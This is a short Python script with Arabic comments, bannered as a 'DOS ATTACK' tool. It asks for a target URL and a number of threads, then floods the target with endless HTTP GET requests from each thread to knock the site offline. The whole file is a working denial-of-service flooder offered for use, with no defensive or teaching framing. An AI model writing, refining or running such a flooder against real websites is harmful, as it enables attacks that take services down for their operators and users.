try:
	from colorama import init, Fore, Style
except ImportError:
	import subprocess
	import sys
	subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
	from colorama import init, Fore, Style
init()

import httpx
#مكتبة إرسال طلبات HTTP
import threading 
#مكتبة تستخدم إنشاء خيوط thread متعددة
import subprocess
import sys
from colorama import init, Fore, Style
import time
import os


try:
	print(Fore.GREEN + """
╔════════╗
║  Yᴏᴜᴅ ║
╚════════╝


        ██████
      ██      ██
     ██  ██  ██  ██
     ██  ██████  ██
     ██          ██
   ██████  ██  ██████
  ██  ██        ██  ██
 ██  ██          ██  ██


🅳 🅾 🆂     🅰 🆃 🆃 🅰 🅲 🅺
""" + Style.RESET_ALL)

	url = input("Url : ")
	thread = int(input("Attack : "))
	def dos():
		while True:
			try:
				w = httpx.get(url, timeout=1)
			#إرسال طلب GET الى موقع الذي تم ادخاله.
			
			# timeout=1 : ادا لم يستجب الخادم خلال ثانية سيتم توقف ومحاولة من جديد.
				print(f"✓ {w.status_code}")
			except:
				print("×××")
				
	for a in range(thread):
		threading.Thread(target=dos).start()
	# في كل تكرار يتم انشاء خيط جديد Thread يقوم بتشغيل دالة dos في الخلفية

except KeyboardInterrupt:
	print("Exit completed...")





